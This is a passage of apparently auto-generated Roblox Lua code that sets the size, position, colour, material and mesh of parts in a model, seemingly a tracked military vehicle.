WedgePart335.Rotation = Vector3.new(-90, 0, 0)
WedgePart335.CanCollide = false
WedgePart335.FormFactor = Enum.FormFactor.Custom
WedgePart335.Size = Vector3.new(0.400000006, 0.200000003, 2.60000014)
WedgePart335.CFrame = CFrame.new(-22.7096386, 8.70049095, 46.1598549, 1, 1.37711768e-05, 5.43959368e-06, -6.180333e-06, -2.95906248e-05, 1, -1.14948455e-06, -1, -1.90853934e-05)
WedgePart335.BackSurface = Enum.SurfaceType.Weld
WedgePart335.BottomSurface = Enum.SurfaceType.Weld
WedgePart335.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart335.Position = Vector3.new(-22.7096386, 8.70049095, 46.1598549)
WedgePart335.Orientation = Vector3.new(-90, 0, 0)
WedgePart335.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh336.Parent = WedgePart335
SpecialMesh336.MeshType = Enum.MeshType.Wedge
WedgePart337.Parent = Model0
WedgePart337.Material = Enum.Material.Metal
WedgePart337.BrickColor = BrickColor.new("Grime")
WedgePart337.Rotation = Vector3.new(90, 0, -0.00999999978)
WedgePart337.CanCollide = false
WedgePart337.FormFactor = Enum.FormFactor.Custom
WedgePart337.Size = Vector3.new(0.200000003, 0.400000006, 3)
WedgePart337.CFrame = CFrame.new(-19.6093693, 8.90126038, 46.4600639, 1, 9.91061097e-05, -1.10227156e-05, -1.22186893e-05, -2.08033562e-05, -1, -0.000123219797, 1, -3.77801443e-05)
WedgePart337.BackSurface = Enum.SurfaceType.Weld
WedgePart337.BottomSurface = Enum.SurfaceType.Weld
WedgePart337.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart337.Position = Vector3.new(-19.6093693, 8.90126038, 46.4600639)
WedgePart337.Orientation = Vector3.new(90, 0.00999999978, 0)
WedgePart337.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh338.Parent = WedgePart337
SpecialMesh338.MeshType = Enum.MeshType.Wedge
Part339.Parent = Model0
Part339.Material = Enum.Material.Metal
Part339.BrickColor = BrickColor.new("Grime")
Part339.Rotation = Vector3.new(-180, 0, -180)
Part339.FormFactor = Enum.FormFactor.Custom
Part339.Size = Vector3.new(5.59999943, 0.799999952, 1.80000031)
Part339.CFrame = CFrame.new(14.889924, 8.40013981, 32.9597015, -1, 8.84130441e-06, -5.35144209e-05, 8.93794913e-06, 1, 8.40500434e-06, 5.54899634e-05, 9.79304605e-06, -1)
Part339.BackSurface = Enum.SurfaceType.Weld
Part339.BottomSurface = Enum.SurfaceType.Weld
Part339.FrontSurface = Enum.SurfaceType.Weld
Part339.LeftSurface = Enum.SurfaceType.Weld
Part339.RightSurface = Enum.SurfaceType.Weld
Part339.TopSurface = Enum.SurfaceType.Weld
Part339.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part339.Position = Vector3.new(14.889924, 8.40013981, 32.9597015)
Part339.Orientation = Vector3.new(0, -180, 0)
Part339.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh340.Parent = Part339
Part341.Parent = Model0
Part341.Material = Enum.Material.Metal
Part341.BrickColor = BrickColor.new("Grime")
Part341.Rotation = Vector3.new(-180, 0, -180)
Part341.CanCollide = false
Part341.FormFactor = Enum.FormFactor.Custom
Part341.Size = Vector3.new(0.399999231, 0.799999893, 5.19999981)
Part341.CFrame = CFrame.new(-4.109828, 4.80027628, 44.0599098, -1, 6.43371504e-06, -5.15642932e-06, 6.81323763e-06, 0.99999088, 1.01975102e-05, 1.28165175e-05, 1.5574049e-05, -1.00000012)
Part341.BackSurface = Enum.SurfaceType.Weld
Part341.BottomSurface = Enum.SurfaceType.Weld
Part341.FrontSurface = Enum.SurfaceType.Weld
Part341.LeftSurface = Enum.SurfaceType.Weld
Part341.RightSurface = Enum.SurfaceType.Weld
Part341.TopSurface = Enum.SurfaceType.Weld
Part341.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part341.Position = Vector3.new(-4.109828, 4.80027628, 44.0599098)
Part341.Orientation = Vector3.new(0, -180, 0)
Part341.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh342.Parent = Part341
Part343.Parent = Model0
Part343.Material = Enum.Material.Metal
Part343.BrickColor = BrickColor.new("Grime")
Part343.Rotation = Vector3.new(180, 0, -180)
Part343.CanCollide = false
Part343.FormFactor = Enum.FormFactor.Custom
Part343.Size = Vector3.new(11.8000002, 0.799999952, 5.20000029)
Part343.CFrame = CFrame.new(11.190012, 7.60010147, 33.6598129, -1, 6.97483983e-06, -1.60322234e-05, 7.09157848e-06, 1, -2.91726792e-07, 1.8407216e-05, 1.37750521e-06, -1)
Part343.BackSurface = Enum.SurfaceType.Weld
Part343.BottomSurface = Enum.SurfaceType.Weld
Part343.FrontSurface = Enum.SurfaceType.Weld
Part343.LeftSurface = Enum.SurfaceType.Weld
Part343.RightSurface = Enum.SurfaceType.Weld
Part343.TopSurface = Enum.SurfaceType.Weld
Part343.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part343.Position = Vector3.new(11.190012, 7.60010147, 33.6598129)
Part343.Orientation = Vector3.new(0, -180, 0)
Part343.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh344.Parent = Part343
Part345.Parent = Model0
Part345.Material = Enum.Material.Metal
Part345.BrickColor = BrickColor.new("Grime")
Part345.Rotation = Vector3.new(180, 0, -180)
Part345.CanCollide = false
Part345.FormFactor = Enum.FormFactor.Custom
Part345.Size = Vector3.new(1.79999959, 0.799999952, 5.20000029)
Part345.CFrame = CFrame.new(16.189827, 7.60006905, 38.8596954, -1, 6.02205955e-06, 3.12409975e-06, 6.11911082e-06, 1, -1.37809102e-05, -1.14872091e-06, -1.23923655e-05, -1)
Part345.BackSurface = Enum.SurfaceType.Weld
Part345.BottomSurface = Enum.SurfaceType.Weld
Part345.FrontSurface = Enum.SurfaceType.Weld
Part345.LeftSurface = Enum.SurfaceType.Weld
Part345.RightSurface = Enum.SurfaceType.Weld
Part345.TopSurface = Enum.SurfaceType.Weld
Part345.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part345.Position = Vector3.new(16.189827, 7.60006905, 38.8596954)
Part345.Orientation = Vector3.new(0, 180, 0)
Part345.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh346.Parent = Part345
Part347.Parent = Model0
Part347.Material = Enum.Material.Metal
Part347.BrickColor = BrickColor.new("Grime")
Part347.Rotation = Vector3.new(180, 0, -180)
Part347.FormFactor = Enum.FormFactor.Custom
Part347.Size = Vector3.new(13.1999998, 1.59999967, 3.60000038)
Part347.CFrame = CFrame.new(-10.9098253, 3.60021257, 34.460022, -1, 6.43994736e-06, -5.3034978e-06, 6.4623523e-06, 1, -7.84834992e-06, 5.75847071e-06, -7.52855431e-06, -1)
Part347.BackSurface = Enum.SurfaceType.Weld
Part347.BottomSurface = Enum.SurfaceType.Weld
Part347.FrontSurface = Enum.SurfaceType.Weld
Part347.LeftSurface = Enum.SurfaceType.Weld
Part347.RightSurface = Enum.SurfaceType.Weld
Part347.TopSurface = Enum.SurfaceType.Weld
Part347.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part347.Position = Vector3.new(-10.9098253, 3.60021257, 34.460022)
Part347.Orientation = Vector3.new(0, -180, 0)
Part347.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh348.Parent = Part347
BlockMesh348.Offset = Vector3.new(0, 0.800000012, 0)
BlockMesh348.Scale = Vector3.new(1.10000002, 2, 1)
BlockMesh348.Scale = Vector3.new(1.10000002, 2, 1)
Part349.Parent = Model0
Part349.Material = Enum.Material.Metal
Part349.BrickColor = BrickColor.new("Grime")
Part349.Rotation = Vector3.new(-180, 0, -180)
Part349.CanCollide = false
Part349.FormFactor = Enum.FormFactor.Custom
Part349.Size = Vector3.new(0.800000191, 1.40000021, 5.19999981)
Part349.CFrame = CFrame.new(16.6903687, 6.50005674, 33.6597786, -1, 7.3178353e-06, -2.29274719e-05, 7.57607449e-06, 1, 1.38828382e-05, 2.81880748e-05, 1.75801961e-05, -1)
Part349.BackSurface = Enum.SurfaceType.Weld
Part349.BottomSurface = Enum.SurfaceType.Weld
Part349.FrontSurface = Enum.SurfaceType.Weld
Part349.LeftSurface = Enum.SurfaceType.Weld
Part349.RightSurface = Enum.SurfaceType.Weld
Part349.TopSurface = Enum.SurfaceType.Weld
Part349.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part349.Position = Vector3.new(16.6903687, 6.50005674, 33.6597786)
Part349.Orientation = Vector3.new(0, -180, 0)
Part349.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh350.Parent = Part349
Part351.Parent = Model0
Part351.Material = Enum.Material.Metal
Part351.BrickColor = BrickColor.new("Grime")
Part351.Rotation = Vector3.new(180, 0, -180)
Part351.FormFactor = Enum.FormFactor.Custom
Part351.Size = Vector3.new(11.8000002, 3.20000005, 5.20000029)
Part351.CFrame = CFrame.new(11.1901808, 5.60010195, 38.8599014, -1, 6.43885596e-06, -5.28130158e-06, 6.4634437e-06, 1, -7.86395231e-06, 5.78066692e-06, -7.51295283e-06, -1)
Part351.BottomSurface = Enum.SurfaceType.Weld
Part351.LeftSurface = Enum.SurfaceType.Weld
Part351.RightSurface = Enum.SurfaceType.Weld
Part351.TopSurface = Enum.SurfaceType.Weld
Part351.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part351.Position = Vector3.new(11.1901808, 5.60010195, 38.8599014)
Part351.Orientation = Vector3.new(0, -180, 0)
Part351.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh352.Parent = Part351
Part353.Parent = Model0
Part353.Material = Enum.Material.Metal
Part353.BrickColor = BrickColor.new("Grime")
Part353.Rotation = Vector3.new(-180, 0, -180)
Part353.FormFactor = Enum.FormFactor.Custom
Part353.Size = Vector3.new(13.1999998, 1.59999967, 3.60000038)
Part353.CFrame = CFrame.new(-10.909873, 3.60028696, 43.2598724, -1, 6.40441704e-06, -4.601201e-06, 6.40441613e-06, 1, 1.49602386e-07, 4.60120282e-06, 1.49572926e-07, -1)
Part353.BottomSurface = Enum.SurfaceType.Weld
Part353.LeftSurface = Enum.SurfaceType.Weld
Part353.RightSurface = Enum.SurfaceType.Weld
Part353.TopSurface = Enum.SurfaceType.Weld
Part353.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part353.Position = Vector3.new(-10.909873, 3.60028696, 43.2598724)
Part353.Orientation = Vector3.new(0, -180, 0)
Part353.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh354.Parent = Part353
BlockMesh354.Offset = Vector3.new(0, 0.800000012, 0)
BlockMesh354.Scale = Vector3.new(1.10000002, 2, 1)
BlockMesh354.Scale = Vector3.new(1.10000002, 2, 1)
Part355.Parent = Model0
Part355.Material = Enum.Material.Metal
Part355.BrickColor = BrickColor.new("Grime")
Part355.Rotation = Vector3.new(-180, 0, -180)
Part355.CanCollide = false
Part355.FormFactor = Enum.FormFactor.Custom
Part355.Size = Vector3.new(11.8000002, 0.399999976, 0.200000003)
Part355.CFrame = CFrame.new(-10.8097591, 6.2003026, 46.5602341, -1, 7.40343285e-06, -2.46297823e-05, 7.77740297e-06, 0.99999088, 5.76178718e-06, 3.21788757e-05, 1.10601068e-05, -1.00000012)
Part355.BackSurface = Enum.SurfaceType.Weld
Part355.BottomSurface = Enum.SurfaceType.Weld
Part355.FrontSurface = Enum.SurfaceType.Weld
Part355.LeftSurface = Enum.SurfaceType.Weld
Part355.RightSurface = Enum.SurfaceType.Weld
Part355.TopSurface = Enum.SurfaceType.Weld
Part355.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part355.Position = Vector3.new(-10.8097591, 6.2003026, 46.5602341)
Part355.Orientation = Vector3.new(0, -180, 0)
Part355.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh356.Parent = Part355
Part357.Parent = Model0
Part357.Material = Enum.Material.Metal
Part357.BrickColor = BrickColor.new("Grime")
Part357.Rotation = Vector3.new(180, 0, -180)
Part357.FormFactor = Enum.FormFactor.Custom
Part357.Size = Vector3.new(5.59999943, 0.799999952, 1.80000031)
Part357.CFrame = CFrame.new(14.8900795, 8.40018654, 44.7598724, -1, 6.8830459e-06, -1.4202913e-05, 7.07082381e-06, 1, -9.31228442e-06, 1.80205971e-05, -6.62894672e-06, -1)
Part357.BackSurface = Enum.SurfaceType.Weld
Part357.BottomSurface = Enum.SurfaceType.Weld
Part357.FrontSurface = Enum.SurfaceType.Weld
Part357.LeftSurface = Enum.SurfaceType.Weld
Part357.RightSurface = Enum.SurfaceType.Weld
Part357.TopSurface = Enum.SurfaceType.Weld
Part357.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part357.Position = Vector3.new(14.8900795, 8.40018654, 44.7598724)
Part357.Orientation = Vector3.new(0, -180, 0)
Part357.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh358.Parent = Part357
Part359.Parent = Model0
Part359.Material = Enum.Material.Metal
Part359.BrickColor = BrickColor.new("Grime")
Part359.Rotation = Vector3.new(-180, 0, -180)
Part359.CanCollide = false
Part359.FormFactor = Enum.FormFactor.Custom
Part359.Size = Vector3.new(0.799999356, 1.19999981, 5.19999981)
Part359.CFrame = CFrame.new(2.69019699, 5.80022383, 44.0595703, -1, 7.91060938e-06, -3.4820343e-05, 8.28971952e-06, 0.99999088, 1.29368718e-05, 4.24804894e-05, 1.83131688e-05, -1.00000012)
Part359.BackSurface = Enum.SurfaceType.Weld
Part359.BottomSurface = Enum.SurfaceType.Weld
Part359.FrontSurface = Enum.SurfaceType.Weld
Part359.LeftSurface = Enum.SurfaceType.Weld
Part359.RightSurface = Enum.SurfaceType.Weld
Part359.TopSurface = Enum.SurfaceType.Weld
Part359.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part359.Position = Vector3.new(2.69019699, 5.80022383, 44.0595703)
Part359.Orientation = Vector3.new(0, -180, 0)
Part359.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh360.Parent = Part359
Part361.Parent = Model0
Part361.Material = Enum.Material.Metal
Part361.BrickColor = BrickColor.new("Grime")
Part361.Rotation = Vector3.new(180, 0, -180)
Part361.CanCollide = false
Part361.FormFactor = Enum.FormFactor.Custom
Part361.Size = Vector3.new(0.799999356, 1.19999981, 5.19999981)
Part361.CFrame = CFrame.new(2.69034576, 5.80008698, 33.6597061, -1, 6.692429e-06, -1.03765615e-05, 7.06659148e-06, 0.99999088, -4.27647774e-06, 1.79255858e-05, 1.02187551e-06, -1.00000012)
Part361.BackSurface = Enum.SurfaceType.Weld
Part361.BottomSurface = Enum.SurfaceType.Weld
Part361.FrontSurface = Enum.SurfaceType.Weld
Part361.LeftSurface = Enum.SurfaceType.Weld
Part361.RightSurface = Enum.SurfaceType.Weld
Part361.TopSurface = Enum.SurfaceType.Weld
Part361.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part361.Position = Vector3.new(2.69034576, 5.80008698, 33.6597061)
Part361.Orientation = Vector3.new(0, -180, 0)
Part361.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh362.Parent = Part361
Part363.Parent = Model0
Part363.Material = Enum.Material.Metal
Part363.BrickColor = BrickColor.new("Grime")
Part363.Rotation = Vector3.new(180, 0, -180)
Part363.FormFactor = Enum.FormFactor.Custom
Part363.Size = Vector3.new(5.19999933, 1.19999993, 4.00000048)
Part363.CFrame = CFrame.new(8.89022923, 8.60020256, 44.0598717, -1, 6.46254784e-06, -5.67977986e-06, 7.01250519e-06, 1, -1.47377223e-05, 1.68665701e-05, -6.87466036e-06, -1)
Part363.BackSurface = Enum.SurfaceType.Weld
Part363.BottomSurface = Enum.SurfaceType.Weld
Part363.FrontSurface = Enum.SurfaceType.Weld
Part363.LeftSurface = Enum.SurfaceType.Weld
Part363.RightSurface = Enum.SurfaceType.Weld
Part363.TopSurface = Enum.SurfaceType.Weld
Part363.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part363.Position = Vector3.new(8.89022923, 8.60020256, 44.0598717)
Part363.Orientation = Vector3.new(0, -180, 0)
Part363.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh364.Parent = Part363
Part365.Parent = Model0
Part365.Material = Enum.Material.Metal
Part365.BrickColor = BrickColor.new("Grime")
Part365.Rotation = Vector3.new(180, 0, -180)
Part365.FormFactor = Enum.FormFactor.Custom
Part365.Size = Vector3.new(6.19999933, 2.20000005, 2.60000038)
Part365.CFrame = CFrame.new(14.9901371, 9.90013123, 44.7598419, -1, 6.21868867e-06, -8.11329301e-07, 6.58744511e-06, 1, -2.47506978e-06, 8.31362831e-06, 2.79819596e-06, -1)
Part365.BackSurface = Enum.SurfaceType.Weld
Part365.BottomSurface = Enum.SurfaceType.Weld
Part365.FrontSurface = Enum.SurfaceType.Weld
Part365.LeftSurface = Enum.SurfaceType.Weld
Part365.RightSurface = Enum.SurfaceType.Weld
Part365.TopSurface = Enum.SurfaceType.Weld
Part365.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part365.Position = Vector3.new(14.9901371, 9.90013123, 44.7598419)
Part365.Orientation = Vector3.new(0, -180, 0)
Part365.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh366.Parent = Part365
Part367.Parent = Model0
Part367.Material = Enum.Material.Metal
Part367.BrickColor = BrickColor.new("Grime")
Part367.Rotation = Vector3.new(180, 0, -180)
Part367.FormFactor = Enum.FormFactor.Custom
Part367.Size = Vector3.new(11.8000002, 0.799999952, 5.20000029)
Part367.CFrame = CFrame.new(11.190093, 7.60022306, 44.059761, -1, 4.3787395e-06, 3.62749852e-05, 4.74697981e-06, 1, -1.41841037e-05, -2.87727416e-05, -8.91064337e-06, -1)
Part367.BackSurface = Enum.SurfaceType.Weld
Part367.BottomSurface = Enum.SurfaceType.Weld
Part367.FrontSurface = Enum.SurfaceType.Weld
Part367.LeftSurface = Enum.SurfaceType.Weld
Part367.RightSurface = Enum.SurfaceType.Weld
Part367.TopSurface = Enum.SurfaceType.Weld
Part367.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part367.Position = Vector3.new(11.190093, 7.60022306, 44.059761)
Part367.Orientation = Vector3.new(0, 180, 0)
Part367.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh368.Parent = Part367
Part369.Parent = Model0
Part369.Material = Enum.Material.Metal
Part369.BrickColor = BrickColor.new("Grime")
Part369.Rotation = Vector3.new(180, 0, -180)
Part369.CanCollide = false
Part369.FormFactor = Enum.FormFactor.Custom
Part369.Size = Vector3.new(3.39999962, 0.799999893, 5.20000029)
Part369.CFrame = CFrame.new(6.99010181, 7.6001296, 38.8598747, -1, 6.44049305e-06, -5.31459591e-06, 6.46180661e-06, 1, -7.84054919e-06, 5.74737214e-06, -7.53635504e-06, -1)
Part369.BackSurface = Enum.SurfaceType.Weld
Part369.BottomSurface = Enum.SurfaceType.Weld
Part369.FrontSurface = Enum.SurfaceType.Weld
Part369.LeftSurface = Enum.SurfaceType.Weld
Part369.RightSurface = Enum.SurfaceType.Weld
Part369.TopSurface = Enum.SurfaceType.Weld
Part369.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part369.Position = Vector3.new(6.99010181, 7.6001296, 38.8598747)
Part369.Orientation = Vector3.new(0, -180, 0)
Part369.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh370.Parent = Part369
Part371.Parent = Model0
Part371.Material = Enum.Material.Metal
Part371.BrickColor = BrickColor.new("Really black")
Part371.Rotation = Vector3.new(-90, 90, 0)
Part371.CanCollide = false
Part371.FormFactor = Enum.FormFactor.Custom
Part371.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part371.CFrame = CFrame.new(-7.3100009, 2.80016303, 31.7599716, -6.42304258e-06, -4.95945733e-06, 1, -1, -8.09017456e-06, -6.47926254e-06, 7.28673149e-06, -1, -6.10251254e-06)
Part371.BottomSurface = Enum.SurfaceType.Weld
Part371.FrontSurface = Enum.SurfaceType.Weld
Part371.LeftSurface = Enum.SurfaceType.Weld
Part371.RightSurface = Enum.SurfaceType.Weld
Part371.TopSurface = Enum.SurfaceType.Weld
Part371.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part371.Position = Vector3.new(-7.3100009, 2.80016303, 31.7599716)
Part371.Orientation = Vector3.new(0, 90, -90)
Part371.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh372.Parent = Part371
Part373.Parent = Model0
Part373.Material = Enum.Material.Metal
Part373.BrickColor = BrickColor.new("Grime")
Part373.Rotation = Vector3.new(-180, 0, -180)
Part373.CanCollide = false
Part373.FormFactor = Enum.FormFactor.Custom
Part373.Size = Vector3.new(1.59999919, 0.799999952, 5.19999981)
Part373.CFrame = CFrame.new(3.09007359, 6.80019569, 44.0596123, -1, 6.8204281e-06, -1.29195741e-05, 7.19992431e-06, 0.99999088, 5.89834963e-06, 2.05796405e-05, 1.12747821e-05, -1.00000012)
Part373.BackSurface = Enum.SurfaceType.Weld
Part373.BottomSurface = Enum.SurfaceType.Weld
Part373.FrontSurface = Enum.SurfaceType.Weld
Part373.LeftSurface = Enum.SurfaceType.Weld
Part373.RightSurface = Enum.SurfaceType.Weld
Part373.TopSurface = Enum.SurfaceType.Weld
Part373.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part373.Position = Vector3.new(3.09007359, 6.80019569, 44.0596123)
Part373.Orientation = Vector3.new(0, -180, 0)
Part373.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh374.Parent = Part373
Part375.Parent = Model0
Part375.Material = Enum.Material.Metal
Part375.BrickColor = BrickColor.new("Grime")
Part375.Rotation = Vector3.new(-180, 0, -180)
Part375.FormFactor = Enum.FormFactor.Custom
Part375.Size = Vector3.new(8, 1.20000005, 5.19999981)
Part375.CFrame = CFrame.new(-21.5098934, 3.4003644, 44.0600357, -1, 7.54534176e-06, -2.77179206e-05, 7.54488246e-06, 1, 1.65513575e-05, 2.77180479e-05, 1.65511501e-05, -1)
Part375.BackSurface = Enum.SurfaceType.Weld
Part375.BottomSurface = Enum.SurfaceType.Weld
Part375.LeftSurface = Enum.SurfaceType.Weld
Part375.RightSurface = Enum.SurfaceType.Weld
Part375.TopSurface = Enum.SurfaceType.Weld
Part375.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part375.Position = Vector3.new(-21.5098934, 3.4003644, 44.0600357)
Part375.Orientation = Vector3.new(0, -180, 0)
Part375.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh376.Parent = Part375
Part377.Parent = Model0
Part377.Material = Enum.Material.Metal
Part377.BrickColor = BrickColor.new("Grime")
Part377.Rotation = Vector3.new(180, 0, -180)
Part377.CanCollide = false
Part377.FormFactor = Enum.FormFactor.Custom
Part377.Size = Vector3.new(6.19999981, 2.39999986, 5.19999981)
Part377.CFrame = CFrame.new(-0.809634686, 4.00016212, 33.659977, -1, 5.6025101e-06, 1.15597104e-05, 5.61264596e-06, 1, -1.9705436e-05, -1.1348955e-05, -1.95571592e-05, -1)
Part377.BackSurface = Enum.SurfaceType.Weld
Part377.BottomSurface = Enum.SurfaceType.Weld
Part377.FrontSurface = Enum.SurfaceType.Weld
Part377.LeftSurface = Enum.SurfaceType.Weld
Part377.RightSurface = Enum.SurfaceType.Weld
Part377.TopSurface = Enum.SurfaceType.Weld
Part377.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part377.Position = Vector3.new(-0.809634686, 4.00016212, 33.659977)
Part377.Orientation = Vector3.new(0, 180, 0)
Part377.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh378.Parent = Part377
Part379.Parent = Model0
Part379.Material = Enum.Material.Metal
Part379.BrickColor = BrickColor.new("Grime")
Part379.Rotation = Vector3.new(180, 0, -180)
Part379.CanCollide = false
Part379.FormFactor = Enum.FormFactor.Custom
Part379.Size = Vector3.new(0.399999231, 0.799999893, 5.19999981)
Part379.CFrame = CFrame.new(-4.10968304, 4.80014801, 33.6599922, -1, 5.95867459e-06, 4.37692006e-06, 5.96897416e-06, 1, -1.46642387e-05, -4.16614375e-06, -1.45159993e-05, -1)
Part379.BackSurface = Enum.SurfaceType.Weld
Part379.BottomSurface = Enum.SurfaceType.Weld
Part379.FrontSurface = Enum.SurfaceType.Weld
Part379.LeftSurface = Enum.SurfaceType.Weld
Part379.RightSurface = Enum.SurfaceType.Weld
Part379.TopSurface = Enum.SurfaceType.Weld
Part379.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part379.Position = Vector3.new(-4.10968304, 4.80014801, 33.6599922)
Part379.Orientation = Vector3.new(0, 180, 0)
Part379.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh380.Parent = Part379
Part381.Name = "wheel"
Part381.Parent = Model0
Part381.Material = Enum.Material.Metal
Part381.BrickColor = BrickColor.new("Grime")
Part381.Transparency = 1
Part381.Rotation = Vector3.new(-90, -90, 0)
Part381.FormFactor = Enum.FormFactor.Symmetric
Part381.Friction = 1
Part381.Shape = Enum.PartType.Ball
Part381.Size = Vector3.new(5, 5, 5)
Part381.CFrame = CFrame.new(-22.5099869, 2.99934506, 49.1596909, -1.68524257e-05, -5.57238771e-08, -1, 1, -4.68407961e-08, -1.6852111e-05, -3.93574737e-08, -1, 6.68240361e-08)
Part381.BottomSurface = Enum.SurfaceType.Smooth
Part381.TopSurface = Enum.SurfaceType.Hinge
Part381.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part381.Position = Vector3.new(-22.5099869, 2.99934506, 49.1596909)
Part381.Orientation = Vector3.new(0, -90, 90)
Part381.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh382.Parent = Part381
CylinderMesh382.Offset = Vector3.new(0, -1.10000002, 0)
CylinderMesh382.Scale = Vector3.new(1, 0.600000024, 1)
CylinderMesh382.Scale = Vector3.new(1, 0.600000024, 1)
Part383.Parent = Model0
Part383.Material = Enum.Material.Metal
Part383.BrickColor = BrickColor.new("Really black")
Part383.Rotation = Vector3.new(-90, 90, 0)
Part383.CanCollide = false
Part383.FormFactor = Enum.FormFactor.Custom
Part383.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part383.CFrame = CFrame.new(-13.909976, 2.80021191, 31.7600212, -6.42304258e-06, -4.95945733e-06, 1, -1, -8.09017456e-06, -6.47926254e-06, 7.28673149e-06, -1, -6.10251254e-06)
Part383.BottomSurface = Enum.SurfaceType.Weld
Part383.FrontSurface = Enum.SurfaceType.Weld
Part383.LeftSurface = Enum.SurfaceType.Weld
Part383.RightSurface = Enum.SurfaceType.Weld
Part383.TopSurface = Enum.SurfaceType.Weld
Part383.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part383.Position = Vector3.new(-13.909976, 2.80021191, 31.7600212)
Part383.Orientation = Vector3.new(0, 90, -90)
Part383.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh384.Parent = Part383
Part385.Parent = Model0
Part385.Material = Enum.Material.Metal
Part385.BrickColor = BrickColor.new("Really black")
Part385.Rotation = Vector3.new(90, -90, 0)
Part385.CanCollide = false
Part385.FormFactor = Enum.FormFactor.Custom
Part385.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part385.CFrame = CFrame.new(-13.9099016, 2.80034089, 45.9599915, -5.31013347e-06, -1.75913701e-05, -1, -1, 8.41797737e-06, 5.30998523e-06, 8.4178846e-06, 1, -1.75914138e-05)
Part385.BottomSurface = Enum.SurfaceType.Weld
Part385.FrontSurface = Enum.SurfaceType.Weld
Part385.LeftSurface = Enum.SurfaceType.Weld
Part385.RightSurface = Enum.SurfaceType.Weld
Part385.TopSurface = Enum.SurfaceType.Weld
Part385.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part385.Position = Vector3.new(-13.9099016, 2.80034089, 45.9599915)
Part385.Orientation = Vector3.new(0, -90, -90)
Part385.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh386.Parent = Part385
WedgePart387.Parent = Model0
WedgePart387.Material = Enum.Material.Metal
WedgePart387.BrickColor = BrickColor.new("Grime")
WedgePart387.Rotation = Vector3.new(-180, -90, 0)
WedgePart387.FormFactor = Enum.FormFactor.Custom
WedgePart387.Size = Vector3.new(5.19999981, 1.20000005, 0.800000072)
WedgePart387.CFrame = CFrame.new(3.49014544, 5.80042076, 33.6599541, -5.22691334e-06, -6.46520948e-06, -1, 5.58827878e-06, -1, 6.48099831e-06, -1, -5.81446511e-06, 5.54879989e-06)
WedgePart387.BottomSurface = Enum.SurfaceType.Weld
WedgePart387.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart387.Position = Vector3.new(3.49014544, 5.80042076, 33.6599541)
WedgePart387.Orientation = Vector3.new(0, -90, 180)
WedgePart387.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh388.Parent = WedgePart387
SpecialMesh388.MeshType = Enum.MeshType.Wedge
WedgePart389.Parent = Model0
WedgePart389.Material = Enum.Material.Metal
WedgePart389.BrickColor = BrickColor.new("Grime")
WedgePart389.Rotation = Vector3.new(180, 90, 0)
WedgePart389.CanCollide = false
WedgePart389.FormFactor = Enum.FormFactor.Custom
WedgePart389.Size = Vector3.new(5.19999981, 1.60000014, 0.400000006)
WedgePart389.CFrame = CFrame.new(-4.10981941, 3.60051203, 33.6600952, 5.08384437e-06, -6.67719132e-06, 1, 8.03388048e-06, -0.999993205, -6.73167688e-06, 1, 7.2622679e-06, -6.18094418e-06)
WedgePart389.BottomSurface = Enum.SurfaceType.Weld
WedgePart389.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart389.Position = Vector3.new(-4.10981941, 3.60051203, 33.6600952)
WedgePart389.Orientation = Vector3.new(0, 90, 180)
WedgePart389.Color = Color3.new(0.498039, 0.556863, 0.392157)
